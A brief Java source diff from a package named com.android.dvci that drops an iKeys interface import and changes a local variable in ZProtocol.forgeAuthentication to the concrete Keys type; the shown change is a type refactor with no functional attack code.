@@ -32,7 +32,6 @@ import com.android.dvci.evidence.EvidenceCollector;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Directory;
 import com.android.dvci.file.Path;
-import com.android.dvci.interfaces.iKeys;
 import com.android.dvci.listener.AR;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
@@ -435,7 +434,7 @@ public class ZProtocol extends Protocol {
 	 * @return the byte[]
 	 */
 	protected byte[] forgeAuthentication() {
-		final iKeys keys = Keys.self();
+		final Keys keys = Keys.self();
 
 		/*
 		 * byte[] randBlock = new byte[]{}; if(Cfg.PROTOCOL_RANDBLOCK){ //
